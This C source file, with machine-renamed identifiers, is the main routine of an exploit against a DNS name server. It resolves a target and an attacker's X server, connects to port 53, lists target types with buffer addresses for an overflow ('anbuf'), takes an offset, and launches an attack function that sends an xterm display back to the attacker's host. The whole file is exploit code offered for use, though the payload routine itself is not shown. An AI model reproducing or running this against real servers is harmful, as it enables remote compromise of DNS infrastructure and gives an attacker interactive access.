
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_3__ TYPE_1__ ;


struct in_addr {void* s_addr; } ;
struct sockaddr_in {struct in_addr sin_addr; int sin_family; int sin_port; } ;
struct sockaddr {int dummy; } ;
typedef int sa ;
struct TYPE_3__ {char* desc; scalar_t__ addr; scalar_t__ opt_addr; } ;


 int VAR_0 ;
 unsigned long VAR_1 ;
 int VAR_2 ;
 int VAR_3 ;
 int VAR_4 ;
 int VAR_5 ;
 void* FUNC_0 (char*) ;
 int FUNC_1 (int,struct in_addr,TYPE_1__,unsigned long,int) ;
 scalar_t__ FUNC_2 (int) ;
 int FUNC_3 (int,struct sockaddr*,int) ;
 int FUNC_4 (int) ;
 int FUNC_5 (int ,char*,...) ;
 int FUNC_6 (int) ;
 char* FUNC_7 (struct in_addr) ;
 int FUNC_8 (char*) ;
 int FUNC_9 (char*,...) ;
 void* FUNC_10 (char*) ;
 int FUNC_11 (int ,int ,int ) ;
 int VAR_6 ;
 TYPE_1__* VAR_7 ;

int FUNC_12(int VAR_8, char *VAR_9[])
{
  unsigned long VAR_10=VAR_1;
  int VAR_11=VAR_3, VAR_12=VAR_2, VAR_13, VAR_14;
  struct sockaddr_in VAR_15;
  struct in_addr VAR_16;

  for(VAR_14=0;VAR_7[VAR_14].desc[0];VAR_14++);

  if(VAR_8<3)
    {
      FUNC_5(VAR_6,"\ntarget types:\n");
      FUNC_5(VAR_6," %-2s : %-12s - %-12s - %s\n","tt","anbuf","opt anbuf",
       "description");
      for(VAR_11=0;VAR_11<VAR_14;VAR_11++)
 FUNC_5(VAR_6," %-2d : 0x%-10x - 0x%-10x - %s\n",VAR_11,
  (unsigned int)VAR_7[VAR_11].addr,
  (unsigned int)VAR_7[VAR_11].opt_addr,
  VAR_7[VAR_11].desc);
      FUNC_5(VAR_6,
       "\nerror: usage: %s <target> <X server> [tt] [opt] [offset]\n",
       VAR_9[0]);
      FUNC_4(-1);
    }

  if((VAR_8>3)&&((VAR_11=FUNC_0(VAR_9[3]))>=VAR_14))
    {
      FUNC_5(VAR_6,"error: invalid target type %d\n",VAR_11);
      FUNC_4(-1);
    }

  if((VAR_7[VAR_11].addr==0)&&(VAR_7[VAR_11].opt_addr==0))
    {
      FUNC_5(VAR_6,"error: internal error\n");
      FUNC_4(-1);
    }

  if(VAR_8>4)
    {
      VAR_12 = FUNC_0(VAR_9[4]);
      if((VAR_12!=0)&&(VAR_12!=1))
 {
   FUNC_5(VAR_6,"error: invalid optimization setting %d\n",VAR_12);
   FUNC_4(-1);
 }
    }

  if((VAR_12==0)&&(VAR_7[VAR_11].addr==0))
    VAR_12 = 1;

  if((VAR_12==1)&&(VAR_7[VAR_11].opt_addr==0))
    VAR_12 = 0;

  if(VAR_8>5)
    VAR_10 = FUNC_0(VAR_9[5]);

  if(!(VAR_16.s_addr=FUNC_10(VAR_9[2])))
    {
      FUNC_5(VAR_6,"error: can not resolve: %s\n",VAR_9[2]);
      FUNC_4(-1);
    }

  if(!(VAR_15.sin_addr.s_addr=FUNC_10(VAR_9[1])))
    {
      FUNC_5(VAR_6,"error: can not resolve: %s\n",VAR_9[1]);
      FUNC_4(-1);
    }

  VAR_15.sin_family = VAR_0;
  VAR_15.sin_port = FUNC_6(53);

  if((VAR_13=FUNC_11(VAR_15.sin_family,VAR_5,VAR_4))==(-1))
    {
      FUNC_8("error: socket");
      FUNC_4(-1);
    }

  if(FUNC_3(VAR_13,(struct sockaddr *)&VAR_15,sizeof(VAR_15))==(-1))
    {
      FUNC_8("error: connect");
      FUNC_4(-1);
    }

  FUNC_9("target             : %s\n",FUNC_7(VAR_15.sin_addr));
  FUNC_9("target type        : %s\n",VAR_7[VAR_11].desc);
  FUNC_9("optimized named    : %s\n",(VAR_12?"YES":"NO"));
  FUNC_9("anbuff addr        : 0x%x\n",(unsigned int)
  (VAR_12?VAR_7[VAR_11].opt_addr:VAR_7[VAR_11].addr));
  FUNC_9("anbuff addr offset : %lu\n",VAR_10);
  FUNC_9("xterm display dest : %s:0\n",FUNC_7(VAR_16));
  FUNC_9("exploiting . . .\n");

  switch(FUNC_1(VAR_13,VAR_16,VAR_7[VAR_11],VAR_10,VAR_12))
    {
    case -1:
      FUNC_8("error: attack");
      return(-1);
      break;

    case 0:
      FUNC_5(VAR_6,"error: internal error\n");
      return(-1);
      break;
    }

  if(FUNC_2(VAR_13)!=0)
    {
      FUNC_8("error: close");
      return(-1);
    }

  FUNC_4(0);
}
